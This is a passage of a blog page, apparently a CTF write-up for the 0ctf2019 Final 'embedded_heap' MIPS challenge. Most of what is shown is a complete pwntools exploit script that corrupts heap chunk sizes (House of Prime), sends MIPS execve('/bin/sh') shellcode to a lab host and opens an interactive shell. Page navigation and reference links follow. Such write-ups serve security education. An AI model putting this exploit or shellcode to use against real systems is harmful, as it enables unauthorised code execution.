class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="keyword">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(p,idx,size,content)</span>:</span></span><br><span class="line">	sla(p,<span class="string">'Command: '</span>,str(<span class="number">1</span>))</span><br><span class="line">	sla(p,<span class="string">'Index: '</span>,str(idx))</span><br><span class="line">	sla(p,<span class="string">'Size: '</span>,str(size))</span><br><span class="line">	sla(p,<span class="string">'Content: '</span>,str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chunk_size</span><span class="params">(size)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> size%<span class="number">4</span>==<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">if</span> size%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">			size = size+<span class="number">4</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		size = size+<span class="number">4</span>-size%<span class="number">4</span></span><br><span class="line">		<span class="keyword">if</span> size%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">			size = size+<span class="number">4</span></span><br><span class="line">	<span class="keyword">if</span> size &lt;= <span class="number">8</span>:</span><br><span class="line">		size = <span class="number">12</span></span><br><span class="line">	<span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p,idx)</span>:</span></span><br><span class="line">	sla(p,<span class="string">'Index: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	DEBUG = <span class="number">0</span></span><br><span class="line">	ATTACH = <span class="number">0</span></span><br><span class="line">	context.arch = <span class="string">'mips'</span></span><br><span class="line">	context.endian = <span class="string">'big'</span></span><br><span class="line">	BIN_PATH = <span class="string">'./embedded_heap'</span></span><br><span class="line">	elf = ELF(BIN_PATH)</span><br><span class="line">	context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">	<span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">		p = process(BIN_PATH)</span><br><span class="line">		context.log_level = <span class="string">'debug'</span></span><br><span class="line">		<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">			libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">			</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">'192.168.122.12'</span>,<span class="number">9999</span>)</span><br><span class="line">		<span class="comment"># libc = ELF('./libc_32.so.6')</span></span><br><span class="line">		context.log_level = <span class="string">'debug'</span></span><br><span class="line">	<span class="comment"># 0x555555554000</span></span><br><span class="line">	<span class="keyword">if</span> ATTACH==<span class="number">1</span>:</span><br><span class="line">		gdb.attach(p,<span class="string">'''</span></span><br><span class="line"><span class="string">		b *0x80486f8</span></span><br><span class="line"><span class="string">		b *0x80488c9</span></span><br><span class="line"><span class="string">		'''</span>)</span><br><span class="line">	ru(p,<span class="string">'Chunk[0]: '</span>)</span><br><span class="line">	ck0_size = int(ru(p,<span class="string">' '</span>)[:<span class="number">-1</span>])</span><br><span class="line">	ck0_size = get_chunk_size(ck0_size)</span><br><span class="line">	ru(p,<span class="string">'Chunk[2]: '</span>)</span><br><span class="line">	ck2_size = int(ru(p,<span class="string">' '</span>)[:<span class="number">-1</span>])</span><br><span class="line">	ck2_size = get_chunk_size(ck2_size)</span><br><span class="line">	log.info(<span class="string">'chunk 0 size: '</span>+str(ck0_size))</span><br><span class="line">	log.info(<span class="string">'chunk 1 size: '</span>+str(ck2_size))</span><br><span class="line">	<span class="comment"># modify size to 8+1, prepare for first free</span></span><br><span class="line">	payload = <span class="string">'a'</span>*ck0_size+p32(<span class="number">8</span>+<span class="number">1</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(<span class="number">0</span>)[:<span class="number">-1</span>]</span><br><span class="line">	update(p,<span class="number">0</span>,ck0_size+<span class="number">0x10</span>,payload)</span><br><span class="line">	<span class="comment"># modify size to 0x305d8+1, prepare for second free</span></span><br><span class="line">	payload = <span class="string">'a'</span>*ck2_size+p32(<span class="number">0x305d9</span>)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0</span>)[:<span class="number">-1</span>]</span><br><span class="line">	update(p,<span class="number">2</span>,ck2_size+<span class="number">0x10</span>,payload)</span><br><span class="line">	<span class="comment"># pwn</span></span><br><span class="line">	sla(p,<span class="string">'Command: '</span>,str(<span class="number">3</span>))</span><br><span class="line">	delete(p,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	sla(p,<span class="string">'Index: '</span>,str(<span class="number">3</span>))</span><br><span class="line">	buf =  <span class="string">""</span></span><br><span class="line">	buf += <span class="string">"\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27"</span></span><br><span class="line">	buf += <span class="string">"\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4"</span></span><br><span class="line">	buf += <span class="string">"\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f"</span></span><br><span class="line">	buf += <span class="string">"\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x00"</span></span><br><span class="line">	sla(p,<span class="string">'Index: '</span>,str(<span class="number">2</span>))</span><br><span class="line">	sla(p,<span class="string">'Size: '</span>,str(ck2_size+<span class="number">0xa0</span>))</span><br><span class="line">	payload = <span class="string">'a'</span>*(ck2_size<span class="number">-4</span>)+buf.ljust(<span class="number">0xa0</span>+<span class="number">4</span>,<span class="string">'\xaa'</span>)</span><br><span class="line">	sa(p,<span class="string">'Content: '</span>,payload)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://seclists.org/bugtraq/2005/Oct/118" target="_blank" rel="noopener">https://seclists.org/bugtraq/2005/Oct/118</a></p>
+<p><a href="https://github.com/jmpews/pwn2exploit/blob/master/PWN%E4%B9%8B%E5%A0%86%E8%A7%A6%E5%8F%91.md" target="_blank" rel="noopener">https://github.com/jmpews/pwn2exploit/blob/master/PWN%E4%B9%8B%E5%A0%86%E8%A7%A6%E5%8F%91.md</a></p>
+<p><a href="https://github.com/qazbnm456/ctf-course/blob/master/slides/w6/heap.md" target="_blank" rel="noopener">https://github.com/qazbnm456/ctf-course/blob/master/slides/w6/heap.md</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/mips/" rel="tag"># mips</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/23/mips-pwn/mips-pwn环境搭建/" rel="next" title="mips-pwn环境搭建">
+                <i class="fa fa-chevron-left"></i> mips-pwn环境搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">e3pem</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/e3pem" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ymyushouxi@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ble55ing.github.io/" title="Ble55ing" target="_blank">Ble55ing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama2in9.top/" title="Ama2in9" target="_blank">Ama2in9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0ctf2019-Final-embedded-heap题解"><span class="nav-number">1.</span> <span class="nav-text">0ctf2019 Final embedded_heap题解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#update"><span class="nav-number">2.1.</span> <span class="nav-text">update</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#View"><span class="nav-number">2.2.</span> <span class="nav-text">View</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn"><span class="nav-number">2.3.</span> <span class="nav-text">Pwn</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Prime"><span class="nav-number">4.</span> <span class="nav-text">House of Prime</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一次free"><span class="nav-number">4.1.</span> <span class="nav-text">第一次free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二次free"><span class="nav-number">4.2.</span> <span class="nav-text">第二次free</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找待覆盖地址"><span class="nav-number">5.1.</span> <span class="nav-text">寻找待覆盖地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证可行性"><span class="nav-number">5.2.</span> <span class="nav-text">验证可行性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计算size"><span class="nav-number">5.3.</span> <span class="nav-text">计算size</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编写exp"><span class="nav-number">5.4.</span> <span class="nav-text">编写exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">e3pem</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
